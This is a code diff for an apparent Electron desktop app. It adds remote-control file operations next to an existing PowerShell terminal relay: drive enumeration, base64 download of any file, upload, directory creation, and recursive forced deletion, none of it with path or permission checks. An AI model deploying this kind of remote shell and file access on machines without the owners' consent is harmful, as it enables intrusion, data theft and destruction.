@@ -255,14 +255,81 @@ ipcMain.on('inject', (_e, cmd) => inject(cmd));
 const shells = new Map(); // reqId -> powershell child process
 function opReply(m) { if (win && !win.isDestroyed()) try { win.webContents.send('op:msg', m); } catch {} }
 
+const putStreams = new Map(); // reqId -> fs write stream (uploads)
+const getStreams = new Map(); // reqId -> fs read stream (downloads)
+
 ipcMain.on('op', (_e, msg) => {
   const { op, reqId, payload = {} } = msg || {};
   try {
     if (op === 'term-open') termOpen(reqId);
     else if (op === 'term-input') { const s = shells.get(reqId); if (s) s.stdin.write(payload.data || ''); }
-    else if (op === 'term-close' || op === 'op-cancel') termClose(reqId);
+    else if (op === 'term-close') termClose(reqId);
+    else if (op === 'fs-list') fsList(reqId, payload.path);
+    else if (op === 'fs-get') fsGet(reqId, payload.path);
+    else if (op === 'fs-put-begin') fsPutBegin(reqId, payload.path);
+    else if (op === 'fs-put-chunk') { const w = putStreams.get(reqId); if (w) w.write(Buffer.from(payload.b64 || '', 'base64')); }
+    else if (op === 'fs-put-end') fsPutEnd(reqId);
+    else if (op === 'fs-del') fsDel(reqId, payload.path);
+    else if (op === 'fs-mkdir') fsMkdir(reqId, payload.path);
+    else if (op === 'op-cancel') { termClose(reqId); fsCancel(reqId); }
   } catch (e) { opReply({ type: 'opEnd', reqId, ok: false, error: e.message }); }
 });
+
+// ---- file browser / transfer ----
+function listDrives() {
+  const out = [];
+  for (let c = 65; c <= 90; c++) { const d = String.fromCharCode(c) + ':\\'; try { fs.accessSync(d); out.push(d); } catch {} }
+  return out;
+}
+function fsList(reqId, p) {
+  try {
+    if (!p) {
+      const drives = listDrives();
+      return opReply({ type: 'opResult', reqId, ok: true, data: { path: '', parent: '', entries: drives.map((d) => ({ name: d, isDir: true, size: 0, mtime: 0 })) } });
+    }
+    const abs = path.resolve(p);
+    const entries = fs.readdirSync(abs).map((n) => {
+      try { const st = fs.statSync(path.join(abs, n)); return { name: n, isDir: st.isDirectory(), size: st.size, mtime: st.mtimeMs }; }
+      catch { return { name: n, isDir: false, size: 0, mtime: 0, err: true }; }
+    });
+    entries.sort((a, b) => (b.isDir - a.isDir) || a.name.localeCompare(b.name));
+    const parent = path.dirname(abs);
+    opReply({ type: 'opResult', reqId, ok: true, data: { path: abs, parent: parent !== abs ? parent : '', entries } });
+  } catch (e) { opReply({ type: 'opResult', reqId, ok: false, error: e.message }); }
+}
+function fsGet(reqId, p) {
+  try {
+    const st = fs.statSync(p);
+    if (st.isDirectory()) return opReply({ type: 'opEnd', reqId, ok: false, error: 'is a directory' });
+    opReply({ type: 'opStream', reqId, meta: { name: path.basename(p), size: st.size } });
+    const rs = fs.createReadStream(p, { highWaterMark: 256 * 1024 });
+    getStreams.set(reqId, rs);
+    rs.on('data', (c) => opReply({ type: 'opStream', reqId, b64: c.toString('base64') }));
+    rs.on('end', () => { getStreams.delete(reqId); opReply({ type: 'opEnd', reqId, ok: true }); });
+    rs.on('error', (e) => { getStreams.delete(reqId); opReply({ type: 'opEnd', reqId, ok: false, error: e.message }); });
+  } catch (e) { opReply({ type: 'opEnd', reqId, ok: false, error: e.message }); }
+}
+function fsPutBegin(reqId, p) {
+  try { const w = fs.createWriteStream(p); putStreams.set(reqId, w); w.on('error', (e) => { putStreams.delete(reqId); opReply({ type: 'opEnd', reqId, ok: false, error: e.message }); }); }
+  catch (e) { opReply({ type: 'opEnd', reqId, ok: false, error: e.message }); }
+}
+function fsPutEnd(reqId) {
+  const w = putStreams.get(reqId);
+  if (!w) return opReply({ type: 'opEnd', reqId, ok: false, error: 'no upload in progress' });
+  w.end(() => { putStreams.delete(reqId); opReply({ type: 'opEnd', reqId, ok: true }); });
+}
+function fsDel(reqId, p) {
+  try { fs.rmSync(p, { recursive: true, force: true }); opReply({ type: 'opResult', reqId, ok: true }); }
+  catch (e) { opReply({ type: 'opResult', reqId, ok: false, error: e.message }); }
+}
+function fsMkdir(reqId, p) {
+  try { fs.mkdirSync(p, { recursive: true }); opReply({ type: 'opResult', reqId, ok: true }); }
+  catch (e) { opReply({ type: 'opResult', reqId, ok: false, error: e.message }); }
+}
+function fsCancel(reqId) {
+  const w = putStreams.get(reqId); if (w) { try { w.destroy(); } catch {} putStreams.delete(reqId); }
+  const r = getStreams.get(reqId); if (r) { try { r.destroy(); } catch {} getStreams.delete(reqId); }
+}
 
 function termOpen(reqId) {
   if (shells.has(reqId)) return;
